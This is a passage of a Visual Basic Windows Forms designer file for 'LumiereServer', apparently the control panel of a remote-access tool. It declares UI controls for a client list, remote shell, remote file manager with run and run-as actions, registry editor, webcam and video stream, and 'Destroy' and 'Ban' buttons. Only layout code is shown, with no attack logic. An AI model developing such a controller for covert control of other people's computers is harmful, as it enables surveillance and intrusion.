' ***********************************************************************
' Assembly         : LumiereServer
' Author           : rezni
' Created          : 06-12-2020
'
' Last Modified By : rezni
' Last Modified On : 06-11-2020
' ***********************************************************************
' <copyright file="LumiereServer.Designer.vb" company="LumiereSombre | HorizonDova">
'     Copyright ©  LumiereSombre Inc. 2020
' </copyright>
' <summary></summary>
' ***********************************************************************
''' <summary>
''' Class LumiereServer.
''' Implements the <see cref="System.Windows.Forms.Form" />
''' </summary>
''' <seealso cref="System.Windows.Forms.Form" />
<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class LumiereServer
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    ''' <summary>
    ''' Represents an element in an XML resource (.resx) file.
    ''' </summary>
    ''' <param name="disposing"><c>true</c> to release both managed and unmanaged resources; <c>false</c> to release only unmanaged resources.</param>
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    ''' <summary>
    ''' The components
    ''' </summary>
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    ''' <summary>
    ''' Initializes the component.
    ''' </summary>
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(LumiereServer))
        Me.panelInfoHolder = New System.Windows.Forms.Panel()
        Me.btnForceVideo = New System.Windows.Forms.Button()
        Me.Label23 = New System.Windows.Forms.Label()
        Me.statusVideo = New System.Windows.Forms.TextBox()
        Me.btnForceRegedit = New System.Windows.Forms.Button()
        Me.Label15 = New System.Windows.Forms.Label()
        Me.statusRegedit = New System.Windows.Forms.TextBox()
        Me.btnForceDownload = New System.Windows.Forms.Button()
        Me.btnForceUpload = New System.Windows.Forms.Button()
        Me.btnForceFtp = New System.Windows.Forms.Button()
        Me.btnForceShell = New System.Windows.Forms.Button()
        Me.Label20 = New System.Windows.Forms.Label()
        Me.statusDownloadMnager = New System.Windows.Forms.TextBox()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.statusUploadMgr = New System.Windows.Forms.TextBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.statusftp = New System.Windows.Forms.TextBox()
        Me.statusshell = New System.Windows.Forms.TextBox()
        Me.Panel3 = New System.Windows.Forms.Panel()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.losver = New System.Windows.Forms.TextBox()
        Me.lver = New System.Windows.Forms.TextBox()
        Me.ldesc = New System.Windows.Forms.TextBox()
        Me.lextra = New System.Windows.Forms.TextBox()
        Me.lcustom = New System.Windows.Forms.TextBox()
        Me.luser = New System.Windows.Forms.TextBox()
        Me.luid = New System.Windows.Forms.TextBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.labelusername = New System.Windows.Forms.Label()
        Me.labeluid = New System.Windows.Forms.Label()
        Me.mMenu = New System.Windows.Forms.MenuStrip()
        Me.FileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.btnViewClientLogs = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExitToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HelpToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HorizonDovaLumiereSombreToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.Button6 = New System.Windows.Forms.Button()
        Me.btnDestroy = New System.Windows.Forms.Button()
        Me.btnCam = New System.Windows.Forms.Button()
        Me.btnBan = New System.Windows.Forms.Button()
        Me.btnLocalDir = New System.Windows.Forms.Button()
        Me.btnLive = New System.Windows.Forms.Button()
        Me.Panel5 = New System.Windows.Forms.Panel()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.Panel9 = New System.Windows.Forms.Panel()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.cmd = New System.Windows.Forms.RichTextBox()
        Me.shellContextMenu = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.shellBtnCancel = New System.Windows.Forms.ToolStripMenuItem()
        Me.panelDebugView = New System.Windows.Forms.Panel()
        Me.TableLayoutPanel1 = New System.Windows.Forms.TableLayoutPanel()
        Me.debugLowLevelView = New System.Windows.Forms.RichTextBox()
        Me.debugView = New System.Windows.Forms.RichTextBox()
        Me.Panel13 = New System.Windows.Forms.Panel()
        Me.Label14 = New System.Windows.Forms.Label()
        Me.pingDisabledClients = New System.Windows.Forms.Timer(Me.components)
        Me.btnUnhideClientsPanel = New System.Windows.Forms.Button()
        Me.hiddenPanel = New System.Windows.Forms.Panel()
        Me.clientList = New System.Windows.Forms.ListBox()
        Me.iconList = New System.Windows.Forms.ImageList(Me.components)
        Me.lblColumnFtp3 = New System.Windows.Forms.Label()
        Me.lblColumnFtp2 = New System.Windows.Forms.Label()
        Me.lblColumnFtp1 = New System.Windows.Forms.Label()
        Me.ftpUrl = New System.Windows.Forms.TextBox()
        Me.btnFtpDownloadInterrupt = New System.Windows.Forms.Button()
        Me.ftpMenu = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.btnFtpOpen = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator2 = New System.Windows.Forms.ToolStripSeparator()
        Me.ftpBtnDownloadFile = New System.Windows.Forms.ToolStripMenuItem()
        Me.ftpBtnRename = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.ftpBtnDelete = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator3 = New System.Windows.Forms.ToolStripSeparator()
        Me.btnFtpRun = New System.Windows.Forms.ToolStripMenuItem()
        Me.btnFtpRunAs = New System.Windows.Forms.ToolStripMenuItem()
        Me.ftpMenuEmptyClick = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ftpBtnRefresh = New System.Windows.Forms.ToolStripMenuItem()
        Me.ftpNewToolstrip = New System.Windows.Forms.ToolStripMenuItem()
        Me.ftpBtnNewFolder = New System.Windows.Forms.ToolStripMenuItem()
        Me.ftpBtnNewFile = New System.Windows.Forms.ToolStripMenuItem()
        Me.ftpBtnUpload = New System.Windows.Forms.ToolStripMenuItem()
        Me.Panel12 = New System.Windows.Forms.Panel()
        Me.btnFtpUploadInterrupt = New System.Windows.Forms.Button()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.btnShortcutHome = New System.Windows.Forms.Button()
        Me.btnShortcutRecycleBin = New System.Windows.Forms.Button()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.btnShortcutDesktop = New System.Windows.Forms.Button()
        Me.btnShortcutWindows = New System.Windows.Forms.Button()
        Me.btnShortcutTemp = New System.Windows.Forms.Button()
        Me.btnShortcutAppData = New System.Windows.Forms.Button()
        Me.btnShortcutStartup = New System.Windows.Forms.Button()
        Me.btnShortcutStartupAll = New System.Windows.Forms.Button()
        Me.Panel14 = New System.Windows.Forms.Panel()
        Me.ftpBtnBack = New System.Windows.Forms.Button()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.Panel6 = New System.Windows.Forms.Panel()
        Me.lblUploadName = New System.Windows.Forms.Label()
        Me.lblDownloadName = New System.Windows.Forms.Label()
        Me.Panel8 = New System.Windows.Forms.Panel()
        Me.ftpUploadProgressBar = New MetroFramework.Controls.MetroProgressBar()
        Me.Panel7 = New System.Windows.Forms.Panel()
        Me.ftpDownloadProgressBar = New MetroFramework.Controls.MetroProgressBar()
        Me.openFileDialog = New System.Windows.Forms.OpenFileDialog()
        Me.uploadBackgroundWorker = New System.ComponentModel.BackgroundWorker()
        Me.panelComponentsList = New MetroFramework.Controls.MetroTabControl()
        Me.MetroTabPage2 = New MetroFramework.Controls.MetroTabPage()
        Me.ftpView = New System.Windows.Forms.ListView()
        Me.clmnName = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.clmnSize = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.clmnLastWriteTime = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ftpOperationHistory = New System.Windows.Forms.ListBox()
        Me.Panel4 = New System.Windows.Forms.Panel()
        Me.lblActivity = New System.Windows.Forms.Label()
        Me.MetroTabPage1 = New MetroFramework.Controls.MetroTabPage()
        Me.cmdHistoryList = New System.Windows.Forms.ListBox()
        Me.MetroTabPage3 = New MetroFramework.Controls.MetroTabPage()
        Me.Panel10 = New System.Windows.Forms.Panel()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.Label21 = New System.Windows.Forms.Label()
        Me.Label22 = New System.Windows.Forms.Label()
        Me.regValueHolder = New System.Windows.Forms.ListView()
        Me.rgClmnName = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.rgClmnType = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.rgClmnData = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.regKeyHolder = New System.Windows.Forms.TreeView()
        Me.txtEditUserDescriptor = New System.Windows.Forms.TextBox()
        Me.panelEditUserDescriptor = New System.Windows.Forms.Panel()
        Me.regKeyContextMenu = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.regBtnKeyRefresh = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator5 = New System.Windows.Forms.ToolStripSeparator()
        Me.regBtnKeyDelete = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator6 = New System.Windows.Forms.ToolStripSeparator()
        Me.regBtnKeyNewSubkey = New System.Windows.Forms.ToolStripMenuItem()
        Me.regValueContextMenu = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.regBtnValueRefresh = New System.Windows.Forms.ToolStripMenuItem()
        Me.regBtnValueDelete = New System.Windows.Forms.ToolStripMenuItem()
        Me.regBtnValueNewValue = New System.Windows.Forms.ToolStripMenuItem()
        Me.listbindingsource = New System.Windows.Forms.BindingSource(Me.components)
        Me.panelInfoHolder.SuspendLayout()
        Me.Panel3.SuspendLayout()
        Me.mMenu.SuspendLayout()
        Me.Panel2.SuspendLayout()
        Me.Panel5.SuspendLayout()
        Me.Panel9.SuspendLayout()
        Me.shellContextMenu.SuspendLayout()
        Me.panelDebugView.SuspendLayout()
        Me.TableLayoutPanel1.SuspendLayout()
        Me.Panel13.SuspendLayout()
        Me.hiddenPanel.SuspendLayout()
        Me.ftpMenu.SuspendLayout()
        Me.ftpMenuEmptyClick.SuspendLayout()
        Me.Panel12.SuspendLayout()
        Me.Panel1.SuspendLayout()
        Me.Panel14.SuspendLayout()
        Me.Panel6.SuspendLayout()
        Me.Panel8.SuspendLayout()
        Me.Panel7.SuspendLayout()
        Me.panelComponentsList.SuspendLayout()
        Me.MetroTabPage2.SuspendLayout()
        Me.Panel4.SuspendLayout()
        Me.MetroTabPage1.SuspendLayout()
        Me.MetroTabPage3.SuspendLayout()
        Me.Panel10.SuspendLayout()
        Me.panelEditUserDescriptor.SuspendLayout()
        Me.regKeyContextMenu.SuspendLayout()
        Me.regValueContextMenu.SuspendLayout()
        CType(Me.listbindingsource, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'panelInfoHolder
        '
        Me.panelInfoHolder.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.panelInfoHolder.Controls.Add(Me.btnForceVideo)
        Me.panelInfoHolder.Controls.Add(Me.Label23)
        Me.panelInfoHolder.Controls.Add(Me.statusVideo)
        Me.panelInfoHolder.Controls.Add(Me.btnForceRegedit)
        Me.panelInfoHolder.Controls.Add(Me.Label15)
        Me.panelInfoHolder.Controls.Add(Me.statusRegedit)
        Me.panelInfoHolder.Controls.Add(Me.btnForceDownload)
        Me.panelInfoHolder.Controls.Add(Me.btnForceUpload)
        Me.panelInfoHolder.Controls.Add(Me.btnForceFtp)
        Me.panelInfoHolder.Controls.Add(Me.btnForceShell)
        Me.panelInfoHolder.Controls.Add(Me.Label20)
        Me.panelInfoHolder.Controls.Add(Me.statusDownloadMnager)
        Me.panelInfoHolder.Controls.Add(Me.Label18)
        Me.panelInfoHolder.Controls.Add(Me.statusUploadMgr)
        Me.panelInfoHolder.Controls.Add(Me.Label1)
        Me.panelInfoHolder.Controls.Add(Me.Label9)
        Me.panelInfoHolder.Controls.Add(Me.statusftp)
        Me.panelInfoHolder.Controls.Add(Me.statusshell)
        Me.panelInfoHolder.Controls.Add(Me.Panel3)
        Me.panelInfoHolder.Controls.Add(Me.losver)
        Me.panelInfoHolder.Controls.Add(Me.lver)
        Me.panelInfoHolder.Controls.Add(Me.ldesc)
        Me.panelInfoHolder.Controls.Add(Me.lextra)
        Me.panelInfoHolder.Controls.Add(Me.lcustom)
        Me.panelInfoHolder.Controls.Add(Me.luser)
        Me.panelInfoHolder.Controls.Add(Me.luid)
        Me.panelInfoHolder.Controls.Add(Me.Label7)
        Me.panelInfoHolder.Controls.Add(Me.Label6)
        Me.panelInfoHolder.Controls.Add(Me.Label5)
        Me.panelInfoHolder.Controls.Add(Me.Label4)
        Me.panelInfoHolder.Controls.Add(Me.Label3)
        Me.panelInfoHolder.Controls.Add(Me.labelusername)
        Me.panelInfoHolder.Controls.Add(Me.labeluid)
        Me.panelInfoHolder.Cursor = System.Windows.Forms.Cursors.Arrow
        Me.panelInfoHolder.Location = New System.Drawing.Point(30, 31)
        Me.panelInfoHolder.Name = "panelInfoHolder"
        Me.panelInfoHolder.Size = New System.Drawing.Size(266, 347)
        Me.panelInfoHolder.TabIndex = 5
        '
        'btnForceVideo
        '
        Me.btnForceVideo.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.btnForceVideo.Cursor = System.Windows.Forms.Cursors.Hand
        Me.btnForceVideo.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnForceVideo.FlatAppearance.BorderSize = 0
        Me.btnForceVideo.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnForceVideo.Font = New System.Drawing.Font("SimSun", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnForceVideo.Location = New System.Drawing.Point(138, 308)
        Me.btnForceVideo.Name = "btnForceVideo"
        Me.btnForceVideo.Size = New System.Drawing.Size(124, 18)
        Me.btnForceVideo.TabIndex = 43
        Me.btnForceVideo.Text = "───── force"
        Me.btnForceVideo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnForceVideo.UseVisualStyleBackColor = False
        '
        'Label23
        '
        Me.Label23.AutoSize = True
        Me.Label23.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label23.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label23.Location = New System.Drawing.Point(9, 305)
        Me.Label23.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label23.Name = "Label23"
        Me.Label23.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label23.Size = New System.Drawing.Size(106, 19)
        Me.Label23.TabIndex = 42
        Me.Label23.Text = "Video Stream"
        '
        'statusVideo
        '
        Me.statusVideo.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.statusVideo.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.statusVideo.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.statusVideo.ForeColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.statusVideo.Location = New System.Drawing.Point(116, 307)
        Me.statusVideo.Multiline = True
        Me.statusVideo.Name = "statusVideo"
        Me.statusVideo.ReadOnly = True
        Me.statusVideo.ShortcutsEnabled = False
        Me.statusVideo.Size = New System.Drawing.Size(35, 21)
        Me.statusVideo.TabIndex = 41
        Me.statusVideo.Text = "off"
        Me.statusVideo.WordWrap = False
        '
        'btnForceRegedit
        '
        Me.btnForceRegedit.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.btnForceRegedit.Cursor = System.Windows.Forms.Cursors.Hand
        Me.btnForceRegedit.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnForceRegedit.FlatAppearance.BorderSize = 0
        Me.btnForceRegedit.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnForceRegedit.Font = New System.Drawing.Font("SimSun", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnForceRegedit.Location = New System.Drawing.Point(138, 288)
        Me.btnForceRegedit.Name = "btnForceRegedit"
        Me.btnForceRegedit.Size = New System.Drawing.Size(124, 18)
        Me.btnForceRegedit.TabIndex = 40
        Me.btnForceRegedit.Text = "───── force"
        Me.btnForceRegedit.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnForceRegedit.UseVisualStyleBackColor = False
        '
        'Label15
        '
        Me.Label15.AutoSize = True
        Me.Label15.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label15.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label15.Location = New System.Drawing.Point(9, 286)
        Me.Label15.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label15.Name = "Label15"
        Me.Label15.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label15.Size = New System.Drawing.Size(106, 19)
        Me.Label15.TabIndex = 39
        Me.Label15.Text = "Registry Edit"
        '
        'statusRegedit
        '
        Me.statusRegedit.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.statusRegedit.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.statusRegedit.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.statusRegedit.ForeColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.statusRegedit.Location = New System.Drawing.Point(116, 287)
        Me.statusRegedit.Multiline = True
        Me.statusRegedit.Name = "statusRegedit"
        Me.statusRegedit.ReadOnly = True
        Me.statusRegedit.ShortcutsEnabled = False
        Me.statusRegedit.Size = New System.Drawing.Size(35, 21)
        Me.statusRegedit.TabIndex = 38
        Me.statusRegedit.Text = "off"
        Me.statusRegedit.WordWrap = False
        '
        'btnForceDownload
        '
        Me.btnForceDownload.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.btnForceDownload.Cursor = System.Windows.Forms.Cursors.Hand
        Me.btnForceDownload.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnForceDownload.FlatAppearance.BorderSize = 0
        Me.btnForceDownload.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnForceDownload.Font = New System.Drawing.Font("SimSun", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnForceDownload.Location = New System.Drawing.Point(138, 269)
        Me.btnForceDownload.Name = "btnForceDownload"
        Me.btnForceDownload.Size = New System.Drawing.Size(124, 18)
        Me.btnForceDownload.TabIndex = 37
        Me.btnForceDownload.Text = "───── force"
        Me.btnForceDownload.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnForceDownload.UseVisualStyleBackColor = False
        '
        'btnForceUpload
        '
        Me.btnForceUpload.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.btnForceUpload.Cursor = System.Windows.Forms.Cursors.Hand
        Me.btnForceUpload.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnForceUpload.FlatAppearance.BorderSize = 0
        Me.btnForceUpload.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnForceUpload.Font = New System.Drawing.Font("SimSun", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnForceUpload.Location = New System.Drawing.Point(138, 248)
        Me.btnForceUpload.Name = "btnForceUpload"
        Me.btnForceUpload.Size = New System.Drawing.Size(124, 18)
        Me.btnForceUpload.TabIndex = 36
        Me.btnForceUpload.Text = "───── force"
        Me.btnForceUpload.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnForceUpload.UseVisualStyleBackColor = False
        '
        'btnForceFtp
        '
        Me.btnForceFtp.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.btnForceFtp.Cursor = System.Windows.Forms.Cursors.Hand
        Me.btnForceFtp.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnForceFtp.FlatAppearance.BorderSize = 0
        Me.btnForceFtp.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnForceFtp.Font = New System.Drawing.Font("SimSun", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnForceFtp.Location = New System.Drawing.Point(138, 226)
        Me.btnForceFtp.Name = "btnForceFtp"
        Me.btnForceFtp.Size = New System.Drawing.Size(124, 18)
        Me.btnForceFtp.TabIndex = 35
        Me.btnForceFtp.Text = "───── force"
        Me.btnForceFtp.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnForceFtp.UseVisualStyleBackColor = False
        '
        'btnForceShell
        '
        Me.btnForceShell.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.btnForceShell.Cursor = System.Windows.Forms.Cursors.Hand
        Me.btnForceShell.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.btnForceShell.FlatAppearance.BorderSize = 0
        Me.btnForceShell.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnForceShell.Font = New System.Drawing.Font("SimSun", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnForceShell.Location = New System.Drawing.Point(138, 206)
        Me.btnForceShell.Name = "btnForceShell"
        Me.btnForceShell.Size = New System.Drawing.Size(124, 18)
        Me.btnForceShell.TabIndex = 34
        Me.btnForceShell.Text = "───── force"
        Me.btnForceShell.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnForceShell.UseVisualStyleBackColor = False
        '
        'Label20
        '
        Me.Label20.AutoSize = True
        Me.Label20.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label20.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label20.Location = New System.Drawing.Point(9, 266)
        Me.Label20.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label20.Name = "Label20"
        Me.Label20.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label20.Size = New System.Drawing.Size(106, 19)
        Me.Label20.TabIndex = 33
        Me.Label20.Text = "Download Mgr"
        '
        'statusDownloadMnager
        '
        Me.statusDownloadMnager.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.statusDownloadMnager.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.statusDownloadMnager.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.statusDownloadMnager.ForeColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.statusDownloadMnager.Location = New System.Drawing.Point(116, 267)
        Me.statusDownloadMnager.Multiline = True
        Me.statusDownloadMnager.Name = "statusDownloadMnager"
        Me.statusDownloadMnager.ReadOnly = True
        Me.statusDownloadMnager.ShortcutsEnabled = False
        Me.statusDownloadMnager.Size = New System.Drawing.Size(35, 21)
        Me.statusDownloadMnager.TabIndex = 32
        Me.statusDownloadMnager.Text = "off"
        Me.statusDownloadMnager.WordWrap = False
        '
        'Label18
        '
        Me.Label18.AutoSize = True
        Me.Label18.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label18.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label18.Location = New System.Drawing.Point(9, 246)
        Me.Label18.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label18.Name = "Label18"
        Me.Label18.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label18.Size = New System.Drawing.Size(106, 19)
        Me.Label18.TabIndex = 31
        Me.Label18.Text = "Uploading Mgr."
        '
        'statusUploadMgr
        '
        Me.statusUploadMgr.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.statusUploadMgr.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.statusUploadMgr.Font = New System.Drawing.Font("Nirmala UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.statusUploadMgr.ForeColor = System.Drawing.Color.FromArgb(CType(CType(214, Byte), Integer), CType(CType(69, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.statusUploadMgr.Location = New System.Drawing.Point(116, 247)
        Me.statusUploadMgr.Multiline = True
        Me.statusUploadMgr.Name = "statusUploadMgr"
        Me.statusUploadMgr.ReadOnly = True
        Me.statusUploadMgr.ShortcutsEnabled = False
        Me.statusUploadMgr.Size = New System.Drawing.Size(34, 21)
        Me.statusUploadMgr.TabIndex = 30
        Me.statusUploadMgr.Text = "off"
        Me.statusUploadMgr.WordWrap = False
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label1.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.Location = New System.Drawing.Point(9, 226)
        Me.Label1.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label1.Name = "Label1"
        Me.Label1.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label1.Size = New System.Drawing.Size(106, 19)
        Me.Label1.TabIndex = 29
        Me.Label1.Text = "Ftp Status"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Label9.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label9.Location = New System.Drawing.Point(9, 206)
        Me.Label9.MinimumSize = New System.Drawing.Size(106, 0)
        Me.Label9.Name = "Label9"
        Me.Label9.Padding = New System.Windows.Forms.Padding(10, 3, 0, 3)
        Me.Label9.Size = New System.Drawing.Size(106, 19)
        Me.Label9.TabIndex = 28
        Me.Label9.Text = "Terminal Status"
        '
        'statusftp
        '
